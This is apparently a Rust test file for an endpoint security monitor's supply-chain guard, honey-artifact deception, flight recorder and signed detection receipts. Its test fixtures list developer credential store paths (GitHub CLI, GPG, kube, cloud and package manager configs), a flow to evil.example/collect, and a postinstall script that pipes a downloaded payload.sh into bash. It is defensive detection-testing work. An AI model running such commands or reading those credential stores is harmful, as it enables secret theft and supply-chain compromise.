            event_id: "policy-context-1".to_string(),
            event_type: PolicyEventType::ToolCall,
            timestamp: Utc::now(),
            session_id: None,
            data: PolicyEventData::Tool(ToolEventData {
                tool_name: "mcp__filesystem__read_file".to_string(),
                parameters: serde_json::json!({ "path": "/repo/.env" }),
            }),
            metadata: Some(serde_json::json!({
                "process": {
                    "pid": 11,
                    "image": "/usr/bin/node",
                    "commandLine": "node mcp-server.js"
                }
            })),
            context: Some(serde_json::json!({
                "endpoint_id": "endpoint-context-1",
                "identity": {
                    "id": "principal-context-1"
                },
                "session": {
                    "session_id": "session-context-1"
                },
                "metadata": {
                    "runtimeAgentId": "runtime-agent-context-1",
                    "spiffeId": "spiffe://example.test/workload/context-1",
                    "approvalRequestId": "approval-context-1",
                    "policyEpoch": 42,
                    "policyVersion": "policy-context-v1"
                }
            })),
        };

        let observation = EndpointObservation::from_policy_event(&event);

        assert_eq!(observation.host_id.as_deref(), Some("endpoint-context-1"));
        assert_eq!(observation.user_id.as_deref(), Some("principal-context-1"));
        assert_eq!(observation.session_id.as_deref(), Some("session-context-1"));
        assert!(!observation.metadata.contains_key("context"));
        assert_eq!(observation.metadata["policyEpoch"], serde_json::json!(42));
        assert_eq!(
            observation.metadata["policyVersion"],
            serde_json::json!("policy-context-v1")
        );

        let actor = EndpointDecisionActor::from_observation("endpoint-context-1", &observation);
        assert_eq!(actor.agent_id.as_deref(), Some("runtime-agent-context-1"));
        assert_eq!(
            actor.workload_id.as_deref(),
            Some("spiffe://example.test/workload/context-1")
        );
        assert_eq!(actor.approval_id.as_deref(), Some("approval-context-1"));

        let mut recorder = CausalGraphRecorder::new();
        let touched_nodes = recorder.record_observation(&observation);
        let process_node = recorder
            .graph()
            .nodes
            .get(&touched_nodes[0])
            .unwrap_or_else(|| panic!("missing process node"));
        assert_eq!(
            process_node.attributes["agentId"],
            "runtime-agent-context-1"
        );
        assert_eq!(
            process_node.attributes["workloadId"],
            "spiffe://example.test/workload/context-1"
        );
        assert_eq!(process_node.attributes["approvalId"], "approval-context-1");
    }

    #[test]
    fn endpoint_observation_projects_to_policy_event() {
        let observation = EndpointObservation {
            observation_id: "history-network-1".to_string(),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                image: Some("/usr/bin/curl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.com".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.com/v1".to_string()),
            },
            ..EndpointObservation::default()
        };

        let event = observation.to_policy_event_projection();

        event
            .validate()
            .unwrap_or_else(|err| panic!("projected policy event should validate: {err}"));
        assert_eq!(event.event_id, "history-network-1");
        assert_eq!(event.event_type, PolicyEventType::NetworkEgress);
        assert_eq!(event.session_id.as_deref(), Some("session-1"));
        match event.data {
            PolicyEventData::Network(network) => {
                assert_eq!(network.host, "api.example.com");
                assert_eq!(network.port, 443);
                assert_eq!(network.protocol.as_deref(), Some("tcp"));
            }
            other => panic!("unexpected projected data: {other:?}"),
        }
        let metadata = event
            .metadata
            .and_then(|value| value.as_object().cloned())
            .unwrap_or_else(|| panic!("projected event should carry endpoint metadata"));
        assert_eq!(metadata["hostId"], "host-1");
        assert_eq!(metadata["endpointObservationId"], "history-network-1");
        assert_eq!(metadata["endpointEventKind"], "network_flow");
    }

    #[test]
    fn dns_lookup_projects_to_custom_policy_event_and_round_trips() {
        let observation = EndpointObservation {
            observation_id: "history-dns-1".to_string(),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                image: Some("/usr/bin/dig".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::DnsLookup {
                query: "api.internal.example".to_string(),
                record_type: Some("AAAA".to_string()),
                answers: vec!["2001:db8::10".to_string()],
                resolver: Some("fd00::53".to_string()),
                status: Some("noerror".to_string()),
            },
            ..EndpointObservation::default()
        };

        let event = observation.to_policy_event_projection();

        event
            .validate()
            .unwrap_or_else(|err| panic!("projected DNS policy event should validate: {err}"));
        assert_eq!(event.event_id, "history-dns-1");
        assert_eq!(event.event_type, PolicyEventType::Custom);
        let PolicyEventData::Custom(custom) = &event.data else {
            panic!("unexpected projected data: {:?}", event.data);
        };
        assert_eq!(custom.custom_type, "endpoint.dns_lookup");
        assert_eq!(custom.extra["endpointEvent"]["type"], "dns_lookup");
        assert_eq!(
            custom.extra["endpointEvent"]["query"],
            "api.internal.example"
        );

        let round_trip = EndpointObservation::from_policy_event(&event);
        match &round_trip.event {
            EndpointEvent::DnsLookup {
                query,
                record_type,
                answers,
                resolver,
                status,
            } => {
                assert_eq!(query, "api.internal.example");
                assert_eq!(record_type.as_deref(), Some("AAAA"));
                assert_eq!(answers, &vec!["2001:db8::10".to_string()]);
                assert_eq!(resolver.as_deref(), Some("fd00::53"));
                assert_eq!(status.as_deref(), Some("noerror"));
            }
            other => panic!("unexpected round-trip event: {other:?}"),
        }
    }

    #[test]
    fn browser_download_projection_preserves_artifact_proof_fields() {
        let content_hash =
            "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let observation = EndpointObservation {
            observation_id: "history-browser-download-1".to_string(),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                image: Some("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome".into()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::BrowserDownload {
                browser: "chrome".to_string(),
                path: "/Users/alice/Downloads/tool.pkg".to_string(),
                source_url: Some("https://downloads.example.invalid/tool.pkg".to_string()),
                content_hash: Some(content_hash.to_string()),
                byte_count: Some(8192),
            },
            ..EndpointObservation::default()
        };

        let event = observation.to_policy_event_projection();

        event
            .validate()
            .unwrap_or_else(|err| panic!("projected browser download should validate: {err}"));
        let PolicyEventData::Custom(custom) = &event.data else {
            panic!("unexpected projected data: {:?}", event.data);
        };
        assert_eq!(custom.custom_type, "endpoint.browser_download");
        assert_eq!(custom.extra["endpointEvent"]["content_hash"], content_hash);
        assert_eq!(custom.extra["endpointEvent"]["byte_count"], 8192);

        let round_trip = EndpointObservation::from_policy_event(&event);
        match &round_trip.event {
            EndpointEvent::BrowserDownload {
                browser,
                path,
                source_url,
                content_hash: observed_hash,
                byte_count,
            } => {
                assert_eq!(browser, "chrome");
                assert_eq!(path, "/Users/alice/Downloads/tool.pkg");
                assert_eq!(
                    source_url.as_deref(),
                    Some("https://downloads.example.invalid/tool.pkg")
                );
                assert_eq!(observed_hash.as_deref(), Some(content_hash));
                assert_eq!(*byte_count, Some(8192));
            }
            other => panic!("unexpected round-trip event: {other:?}"),
        }

        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&round_trip);
        let download_node = recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::BrowserDownload)
            .unwrap_or_else(|| panic!("missing browser download node"));
        assert_eq!(download_node.attributes["contentHash"], content_hash);
        assert_eq!(download_node.attributes["byteCount"], 8192);

        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[round_trip],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );
        let projections = &report.observations[0].projections;
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.browserDownload.contentHash"
                && projection.redaction_class == EndpointEvidenceRedactionClass::MetadataOnly
                && projection.feature_value.as_deref() == Some(content_hash)
        }));
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.browserDownload.byteCount"
                && projection.redaction_class == EndpointEvidenceRedactionClass::MetadataOnly
                && projection.feature_value.as_deref() == Some("8192")
        }));
    }

    #[test]
    fn policy_event_secret_scope_maps_to_typed_credential_detection() {
        let event = PolicyEvent {
            event_id: "policy-secret-1".to_string(),
            event_type: PolicyEventType::SecretAccess,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Secret(crate::event::SecretEventData {
                secret_name: "NPM_TOKEN".to_string(),
                scope: "npm_registry".to_string(),
            }),
            metadata: Some(serde_json::json!({
                "process": {
                    "pid": 9,
                    "image": "/usr/bin/node",
                    "commandLine": "node install.js"
                }
            })),
            context: None,
        };

        let observation = EndpointObservation::from_policy_event(&event);

        match &observation.event {
            EndpointEvent::CredentialAccess { kind, name, .. } => {
                assert_eq!(kind, &CredentialKind::PackageRegistryToken);
                assert_eq!(name.as_deref(), Some("NPM_TOKEN"));
            }
            other => panic!("unexpected event: {other:?}"),
        }

        let findings = SupplyChainRuntimeGuard::new().evaluate(&observation);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.developer_secret_access");
        assert!(findings[0].evidence.iter().any(|item| {
            item.key == "credentialKind" && item.value == "package_registry_token"
        }));
    }

    #[test]
    fn supply_chain_guard_flags_developer_cli_token_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.config/gh/hosts.yml",
            "/Users/alice/.config/glab-cli/config.yml",
            "/Users/alice/.config/hub",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("cli-token-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_local_signing_key_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.config/sops/age/keys.txt",
            "/Users/alice/.age/key.txt",
            "/Users/alice/.gnupg/private-keys-v1.d/ABCD1234.key",
            "/Users/alice/.gnupg/secring.gpg",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("signing-key-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_cloud_credential_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.kube/config",
            "/Users/alice/.terraform.d/credentials.tfrc.json",
            "/Users/alice/.terraformrc",
            "/Users/alice/.config/pulumi/credentials.json",
            "/Users/alice/.pulumi/credentials.json",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("cloud-credential-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_package_manager_credential_store_access() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            "/Users/alice/.yarnrc.yml",
            "/Users/alice/.config/pip/pip.conf",
            "/Users/alice/.config/pypoetry/auth.toml",
            "/Users/alice/Library/Application Support/pypoetry/auth.toml",
            "/Users/alice/.m2/settings.xml",
            "/Users/alice/.gradle/gradle.properties",
            "/Users/alice/.nuget/NuGet/NuGet.Config",
        ];

        for path in cases {
            let event = observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("unknown".to_string()),
                path: Some(path.to_string()),
                name: Some("package-manager-credential-store".to_string()),
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
                .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "path" && item.value == path),
                "missing path evidence for {path}"
            );
        }
    }

    #[test]
    fn policy_event_browser_cookie_secret_can_trigger_honey_deception() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::BrowserCookieJar)
            .unwrap();
        let event = PolicyEvent {
            event_id: "policy-cookie-1".to_string(),
            event_type: PolicyEventType::SecretAccess,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Secret(crate::event::SecretEventData {
                secret_name: format!("intranet.invalid/session={}", artifact.marker),
                scope: "browser_cookie".to_string(),
            }),
            metadata: None,
            context: None,
        };

        let observation = EndpointObservation::from_policy_event(&event);

        match &observation.event {
            EndpointEvent::CredentialAccess { kind, .. } => {
                assert_eq!(kind, &CredentialKind::BrowserCookie);
            }
            other => panic!("unexpected event: {other:?}"),
        }

        let findings = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone())
            .evaluate(&observation);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "browser_cookie"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_persists_and_rebuilds_graph() {
        let root = temp_root();
        let path = root.join("flight-recorder.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();

        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-rebuild-1".to_string();

        recorder
            .append_observations(&[file.clone(), network.clone()])
            .unwrap();
        assert_eq!(recorder.observation_count(), 2);
        assert!(path.is_file());
        assert!(recorder
            .graph()
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));

        let reopened = EndpointFlightRecorder::open(&path).unwrap();
        assert_eq!(reopened.observation_count(), 2);
        assert_eq!(reopened.graph().nodes.len(), recorder.graph().nodes.len());
        assert_eq!(reopened.graph().edges.len(), recorder.graph().edges.len());
        assert_eq!(reopened.path(), Some(path.as_path()));
        assert!(endpoint_flight_recorder_index_path(&path).is_file());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_indexes_latest_matching_history_window() {
        let root = temp_root();
        let path = root.join("flight-recorder-window.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let base = Utc::now();
        let mut first_network = observation(EndpointEvent::NetworkFlow {
            host: "first.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        first_network.observation_id = "network-window-1".to_string();
        first_network.timestamp = base;
        let mut file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        file.observation_id = "file-window-1".to_string();
        file.timestamp = base + chrono::Duration::seconds(1);
        let mut second_network = observation(EndpointEvent::NetworkFlow {
            host: "second.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        second_network.observation_id = "network-window-2".to_string();
        second_network.timestamp = base + chrono::Duration::seconds(2);
        let mut third_network = observation(EndpointEvent::NetworkFlow {
            host: "third.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        third_network.observation_id = "network-window-3".to_string();
        third_network.timestamp = base + chrono::Duration::seconds(3);

        recorder
            .append_observations(&[
                first_network,
                file,
                second_network.clone(),
                third_network.clone(),
            ])
            .unwrap();

        let window = recorder
            .read_indexed_observation_window(2, |entry| entry.event_kind == "network_flow")
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(
            window.index_path.as_deref(),
            Some(endpoint_flight_recorder_index_path(&path).as_path())
        );
        assert_eq!(window.total_observation_count, 4);
        assert_eq!(window.matched_observation_count, 3);
        assert_eq!(
            window
                .selected_observations
                .iter()
                .map(|observation| observation.observation_id.as_str())
                .collect::<Vec<_>>(),
            vec!["network-window-2", "network-window-3"]
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_indexes_identity_metadata_for_history_selection() {
        let root = temp_root();
        let path = root.join("flight-recorder-identity-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut matching = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::CloudCredential,
            path: Some("/Users/alice/.config/cloud/token".to_string()),
            name: Some("cloud-token".to_string()),
        });
        matching.observation_id = "identity-index-match".to_string();
        matching.host_id = Some("endpoint-a".to_string());
        matching.user_id = Some("alice@example.com".to_string());
        matching.session_id = Some("session-a".to_string());
        matching.process.process_guid = Some("process-a".to_string());
        matching.process.parent_process_guid = Some("parent-process-a".to_string());
        matching.process.image = Some("/usr/local/bin/codex".to_string());
        matching.process.command_line = Some("/usr/local/bin/codex exec task".to_string());
        matching.metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent-codex".to_string()),
        );
        matching.metadata.insert(
            "workloadId".to_string(),
            serde_json::Value::String("workload-local".to_string()),
        );
        matching.metadata.insert(
            "approvalId".to_string(),
            serde_json::Value::String("approval-123".to_string()),
        );
        matching.metadata.insert(
            "toolName".to_string(),
            serde_json::Value::String("mcp__browser__open_url".to_string()),
        );
        matching.metadata.insert(
            "toolCallId".to_string(),
            serde_json::Value::String("tool-call-123".to_string()),
        );
        let mut other = matching.clone();
        other.observation_id = "identity-index-other".to_string();
        other.session_id = Some("session-b".to_string());
        other.metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent-other".to_string()),
        );

        recorder
            .append_observations(&[matching.clone(), other])
            .unwrap();

        let entries =
            read_endpoint_observation_index(&endpoint_flight_recorder_index_path(&path)).unwrap();
        let indexed = entries
            .iter()
            .find(|entry| entry.observation_id == "identity-index-match")
            .unwrap();
        assert_eq!(indexed.host_id.as_deref(), Some("endpoint-a"));
        assert_eq!(indexed.user_id.as_deref(), Some("alice@example.com"));
        assert_eq!(indexed.session_id.as_deref(), Some("session-a"));
        assert_eq!(indexed.process_guid.as_deref(), Some("process-a"));
        assert_eq!(
            indexed.parent_process_guid.as_deref(),
            Some("parent-process-a")
        );
        assert_eq!(
            indexed.process_image_hash.as_deref(),
            Some(sha256(b"/usr/local/bin/codex").to_hex_prefixed().as_str())
        );
        assert_eq!(
            indexed.process_command_line_hash.as_deref(),
            Some(
                sha256(b"/usr/local/bin/codex exec task")
                    .to_hex_prefixed()
                    .as_str()
            )
        );
        assert_eq!(indexed.agent_id.as_deref(), Some("agent-codex"));
        assert_eq!(indexed.workload_id.as_deref(), Some("workload-local"));
        assert_eq!(indexed.approval_id.as_deref(), Some("approval-123"));
        assert_eq!(indexed.tool_name.as_deref(), Some("mcp__browser__open_url"));
        assert_eq!(indexed.tool_call_id.as_deref(), Some("tool-call-123"));
        assert_eq!(indexed.credential_kind.as_deref(), Some("cloud_credential"));
        assert_eq!(indexed.event_target.as_deref(), Some("cloud-token"));
        assert_eq!(
            indexed.event_target_hash.as_deref(),
            Some(sha256(b"cloud-token").to_hex_prefixed().as_str())
        );

        let window = recorder
            .read_indexed_observation_window(10, |entry| {
                entry.session_id.as_deref() == Some("session-a")
                    && entry.agent_id.as_deref() == Some("agent-codex")
                    && entry.parent_process_guid.as_deref() == Some("parent-process-a")
                    && entry.process_image_hash.as_deref()
                        == Some(sha256(b"/usr/local/bin/codex").to_hex_prefixed().as_str())
                    && entry.process_command_line_hash.as_deref()
                        == Some(
                            sha256(b"/usr/local/bin/codex exec task")
                                .to_hex_prefixed()
                                .as_str(),
                        )
                    && entry.workload_id.as_deref() == Some("workload-local")
                    && entry.approval_id.as_deref() == Some("approval-123")
                    && entry.tool_name.as_deref() == Some("mcp__browser__open_url")
                    && entry.tool_call_id.as_deref() == Some("tool-call-123")
                    && entry.credential_kind.as_deref() == Some("cloud_credential")
                    && entry.event_target.as_deref() == Some("cloud-token")
                    && entry.event_target_hash.as_deref()
                        == Some(sha256(b"cloud-token").to_hex_prefixed().as_str())
            })
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.matched_observation_count, 1);
        assert_eq!(window.selected_observations.len(), 1);
        assert_eq!(window.selected_observations[0], matching);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_corrupt_sidecar_index_on_seek_mismatch() {
        let root = temp_root();
        let path = root.join("flight-recorder-corrupt-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "corrupt-index.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        network.observation_id = "network-corrupt-index-1".to_string();
        recorder.append_observations(&[network.clone()]).unwrap();

        let index_path = endpoint_flight_recorder_index_path(&path);
        let mut entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(entries.len(), 1);
        entries[0].observation_id = "network-corrupt-index-tampered".to_string();
        replace_endpoint_observation_index(&path, &entries).unwrap();

        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.event_kind == "network_flow")
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.selected_observations.len(), 1);
        assert_eq!(
            window.selected_observations[0].observation_id,
            "network-corrupt-index-1"
        );
        let rebuilt_entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(rebuilt_entries[0].observation_id, "network-corrupt-index-1");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_sidecar_index_on_event_kind_mismatch() {
        let root = temp_root();
        let path = root.join("flight-recorder-event-kind-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        file.observation_id = "file-event-kind-index-1".to_string();
        recorder.append_observations(&[file]).unwrap();

        let index_path = endpoint_flight_recorder_index_path(&path);
        let mut entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(entries.len(), 1);
        entries[0].event_kind = "network_flow".to_string();
        replace_endpoint_observation_index(&path, &entries).unwrap();

        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.event_kind == "network_flow")
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.total_observation_count, 1);
        assert_eq!(window.matched_observation_count, 0);
        assert!(window.selected_observations.is_empty());
        let rebuilt_entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(rebuilt_entries[0].event_kind, "file_access");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_sidecar_index_on_timestamp_mismatch() {
        let root = temp_root();
        let path = root.join("flight-recorder-timestamp-index.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let base = Utc::now();
        let mut file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        file.observation_id = "file-timestamp-index-1".to_string();
        file.timestamp = base;
        recorder.append_observations(&[file]).unwrap();

        let index_path = endpoint_flight_recorder_index_path(&path);
        let mut entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(entries.len(), 1);
        entries[0].timestamp = base + chrono::Duration::hours(1);
        replace_endpoint_observation_index(&path, &entries).unwrap();

        let cutoff = base + chrono::Duration::minutes(30);
        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.timestamp >= cutoff)
            .unwrap();

        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.total_observation_count, 1);
        assert_eq!(window.matched_observation_count, 0);
        assert!(window.selected_observations.is_empty());
        let rebuilt_entries = read_endpoint_observation_index(&index_path).unwrap();
        assert_eq!(rebuilt_entries[0].timestamp, base);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_rebuilds_sidecar_indexes_with_unknown_fields() {
        let root = temp_root();
        let path = root.join("flight-recorder-unknown-index-field.jsonl");
        let mut recorder = EndpointFlightRecorder::open(&path).unwrap();
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "unknown-index.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: None,
        });
        network.observation_id = "network-unknown-index-field-1".to_string();
        recorder.append_observations(&[network]).unwrap();

        let history_index_path = endpoint_flight_recorder_index_path(&path);
        let history_entries = read_endpoint_observation_index(&history_index_path).unwrap();
        assert_eq!(history_entries.len(), 1);
        let mut unknown_history_entry = serde_json::to_value(&history_entries[0]).unwrap();
        unknown_history_entry["shadowByteOffset"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&history_index_path, &unknown_history_entry);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_observation_index(&history_index_path).unwrap_err(),
            "shadowByteOffset",
        );

        let window = recorder
            .read_indexed_observation_window(1, |entry| entry.event_kind == "network_flow")
            .unwrap();
        assert_eq!(window.selection_mode, "sidecar_index_seek");
        assert_eq!(window.selected_observations.len(), 1);
        let rebuilt_history_entries = read_endpoint_observation_index(&history_index_path).unwrap();
        assert_eq!(
            rebuilt_history_entries[0].observation_id,
            "network-unknown-index-field-1"
        );

        let (node_index_path, node_entries) = recorder.read_graph_node_index().unwrap();
        assert!(!node_entries.is_empty());
        let mut unknown_node_entry = serde_json::to_value(&node_entries[0]).unwrap();
        unknown_node_entry["shadowAttribute"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&node_index_path, &unknown_node_entry);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_graph_node_index(&node_index_path).unwrap_err(),
            "shadowAttribute",
        );
        let (_, rebuilt_node_entries) = recorder.read_graph_node_index().unwrap();
        assert_eq!(
            rebuilt_node_entries,
            endpoint_graph_node_index_entries(recorder.graph())
        );

        let (edge_index_path, edge_entries) = recorder.read_graph_edge_index().unwrap();
        assert!(!edge_entries.is_empty());
        let mut unknown_edge_entry = serde_json::to_value(&edge_entries[0]).unwrap();
        unknown_edge_entry["shadowObservationId"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&edge_index_path, &unknown_edge_entry);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_graph_edge_index(&edge_index_path).unwrap_err(),
            "shadowObservationId",
        );
        let (_, rebuilt_edge_entries) = recorder.read_graph_edge_index().unwrap();
        assert_eq!(
            rebuilt_edge_entries,
            endpoint_graph_edge_index_entries(recorder.graph())
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_flight_recorder_reports_corrupt_jsonl_line() {
        let root = temp_root();
        let path = root.join("flight-recorder.jsonl");
        fs::create_dir_all(&root).unwrap();
        fs::write(&path, "{not-json}\n").unwrap();

        let err = EndpointFlightRecorder::open(&path).unwrap_err();
        assert!(err
            .to_string()
            .contains("invalid endpoint observation JSONL"));
        assert!(err.to_string().contains(":1"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_decision_receipt_for_detection_signs_and_verifies() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let keypair = hush_core::Keypair::from_seed(&[7u8; 32]);

        let mut receipt = valid_detection_receipt(
            1,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(signed.receipt.receipt_id, Some(receipt.receipt_id()));
        assert!(!signed.receipt.verdict.passed);
        assert_eq!(
            signed.receipt.verdict.gate_id.as_deref(),
            Some("supply_chain.install_script.risky")
        );
        assert!(signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .and_then(|metadata| metadata.get("decision"))
            .and_then(|decision| decision.get("findingId"))
            .and_then(serde_json::Value::as_str)
            .is_some_and(|value| value == finding.finding_id));
        assert!(receipt.evidence.iter().all(|item| item.raw_value.is_none()
            && item.redaction_class == EndpointEvidenceRedactionClass::HashOnly
            && item.value_hash.starts_with("0x")));
        assert!(receipt.graph.process_node_id.is_some());
        assert!(!receipt.graph.edge_ids.is_empty());
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "detectionFindingId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "detectionGraphSliceId"));

        let mut receipt_value = serde_json::to_value(&receipt)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint receipt: {err}"));
        receipt_value["unsignedExtra"] = serde_json::Value::String("must not be ignored".into());
